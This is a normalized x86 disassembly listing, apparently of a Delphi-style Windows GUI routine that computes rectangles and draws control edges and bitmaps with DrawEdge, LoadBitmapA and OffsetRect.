mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cc88
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41cc90
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fc28
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44c687
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_420d10
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41c4c4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_449004
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41cc90
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d034
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cc88
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_421d14
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cc64
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d034
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d034
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d1b8
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4492f4
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cc90
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44bff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41c790
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d530
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41cf88
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41c4c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403224
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d530
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44bff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cb2f
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44b0b4
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44bff0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_44cb48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_44d450
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d034
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41cc90
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c4c4
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404368
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41cc90
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d034
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_449004
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d530
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cc88
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41cc90
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41cc90
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d034
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cc88
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_421d14
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cc64
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d034
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d034
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fc28
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44cf93
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_420d10
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41c4c4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
